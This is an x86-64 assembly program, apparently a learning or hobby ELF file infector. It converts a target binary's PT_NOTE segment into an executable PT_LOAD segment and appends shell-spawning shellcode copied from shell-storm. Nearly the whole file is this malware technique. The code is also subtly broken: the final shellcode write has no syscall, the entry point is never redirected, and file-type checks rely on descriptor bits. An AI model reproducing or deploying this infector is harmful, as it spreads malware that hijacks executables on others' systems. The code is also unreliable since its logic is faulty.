section .data
    flags dq 2      ; 0_RDWR
    mode dq 0666    ; r/w permissions for user, group and others

    ; File to open
    filename db "hello", 0

    ; Buffer to retrieve the ELF header
    buffer_len equ 4096       ; Assuming a PT_NOTE is present and is within the first 4096 bytes
    buffer times buffer_len db 0

    ; Messages
    elf_msg db "This file has a ELF header.", 10
    elf_len equ $ - elf_msg

    ; Error messages
    not_elf_msg db "This file does not have a ELF header.", 10
    not_elf_len equ $ - not_elf_msg

    is_dir_msg db "The provided file is a directory.", 10
    is_dir_len equ $ - is_dir_msg

    miss_msg db "The provided file does not exist.", 10
    miss_len equ $ - miss_msg

    ; Using https://shell-storm.org/shellcode/files/shellcode-603.html
    shellcode db 0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7, 0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, 0x3B, 0x0F, 0x05
        db 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00 ; movabs 0x0 (little endian) rax 
        db 0xFF, 0xE0 ; jmp rax
    shellcode_len equ $ - shellcode

section .bss
    fd resq 1
    old_e_entry resq 1
    ph_offset resq 1
    ph_entry_size resq 1
    ph_num resq 1
    loop_counter resq 1
    stat_buffer resb 144
    file_size resq 1

section .text
    global _start

_start:
    ; Open the file
    mov rax, 2
    mov rdi, filename
    mov rsi, [flags]
    mov rdx, [mode]
    syscall
    mov [fd], rax        ; file descriptor

    ; Read the file contents
    mov rax, 0          
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, buffer_len
    syscall

    ; Get file information
    mov rax, 5
    mov rdi, [fd]
    mov rsi, stat_buffer
    syscall

    ; Get the file size
    mov rax, [stat_buffer + 48]  
    mov [file_size], rax

    ; Check if it is a directory
    jmp check_dir

check_dir:
    ; Depending on the file descriptor LSB, we know if it's a file, a directory or a missing file
    ; File's LSB is 3, directory's is B and missing file's is E
    mov rdi, [fd]
    and rdi, 0xF        ; Get the LSB

    cmp rdi, 0xB        ; Check if it is a directory
    je is_dir

    cmp rdi, 0xE        ; Check if it is a missing file
    je missing_file

    ; If it is not a directory, check if it is an ELF file
    jmp check_elf

    check_elf:
    ; Check for leading characters of a file with an ELF header
    mov rsi, buffer
    mov al, [rsi]
    cmp al, 0x7F
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'E'
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'L'
    jne not_elf

    inc rsi
    mov al, [rsi]
    cmp al, 'F'
    jne not_elf

    jmp is_elf

is_dir:
    ; Display an error message
    mov rax, 1          
    mov rdi, 1
    mov rsi, is_dir_msg
    mov rdx, is_dir_len
    syscall

    jmp close

missing_file:
    ; Display an error message
    mov rax, 1          
    mov rdi, 1
    mov rsi, miss_msg
    mov rdx, miss_len
    syscall

    jmp close

is_elf:
    ; Display ELF header message
    mov rax, 1          
    mov rdi, 1
    mov rsi, elf_msg
    mov rdx, elf_len
    syscall

    jmp retrieve_info

retrieve_info:
    ; Retrieve information needed to infect the ELF file
    mov rsi, buffer
    add rsi, 24
    mov rax, [rsi]      ; Get the e_entry field
    mov [old_e_entry], rax

    add rsi, 8         ; Move to the e_phoff field (32 bytes offset in the ELF header)
    mov rax, [rsi]      ; Get the e_phoff field
    mov [ph_offset], rax

    add rsi, 22         ; Move to the e_phentsize field
    mov ax, word [rsi]  ; Get the e_phentsize field
    movzx rax, ax
    mov [ph_entry_size], rax

    add rsi, 2          ; Move to the e_phnum field
    mov ax, word [rsi]  ; Get the e_phnum field
    movzx rax, ax
    mov [ph_num], rax

    ; Parse program header
    mov rcx, [ph_num]
    test rcx, rcx
    jz close

    mov rsi, buffer
    add rsi, [ph_offset]

    jmp search_pt_note

search_pt_note:
    ; Search for a PT_NOTE segment
    mov [loop_counter], rcx

    mov rax, [rsi]      ; Get the p_type field
    cmp eax, 4          ; Check if it is a PT_NOTE segment (isolate the last 8 bits because it's written on 8 bits)
    jne next_ph

    jmp infect

next_ph:
    ; Move to the next program header
    add rsi, [ph_entry_size]
    mov rcx, [loop_counter]
    dec rcx
    mov [loop_counter], rcx
    jnz search_pt_note

    jmp close

infect:
    ; Change PT_NOTE segment to PT_LOAD
    xor eax, eax        ; Clear eax
    or eax, 1           ; Set the last 16 bits to 1 (PT_LOAD)
    mov [rsi], eax

    ; Give read and execute permissions to the segment
    xor eax, eax        ; Clear eax
    or eax, 5           ; r/x permissions
    mov [rsi + 4], eax

    ; Change the offset to the end
    ; p_offset is twice as big so we'll use rax
    mov rax, [file_size]
    mov [rsi + 8], rax

    ; Change the entry point to somewhere very far
    xor rax, rax
    or rax, 0xF00000
    add rax, [file_size]
    mov [rsi + 16], rax

    ; Add shellcode_len to filesz and memsz
    mov rax, [rsi + 32] ; Get the p_filesz field
    add rax, shellcode_len
    mov [rsi + 32], rax

    mov rax, [rsi + 40] ; Get the p_memsz field
    add rax, shellcode_len
    mov [rsi + 40], rax

    ; Set p_align to 0x1000 (most PT_LOAD segment have P_ALIGN at 0x1000)
    mov rax, 0x1000
    mov [rsi + 48], rax


    ; Write the changes to the file
    mov rax, 18      ; pwrite64
    mov rdi, [fd]   
    mov rsi, buffer
    mov rdx, [file_size]
    xor r10, r10    ; No offset
    syscall

    ; Write the shellcode at the end of the file
    mov rax, 18      ; pwrite64
    mov rdi, [fd]
    mov rsi, shellcode
    mov rdx, shellcode_len
    mov r10, [file_size]

    jmp close

not_elf:
    ; Display an error message
    mov rax, 1
    mov rdi, 1
    mov rsi, not_elf_msg
    mov rdx, not_elf_len
    syscall

    jmp close

close:
    ; Close the file and exit
    mov rax, 3
    mov rdi, [fd]
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall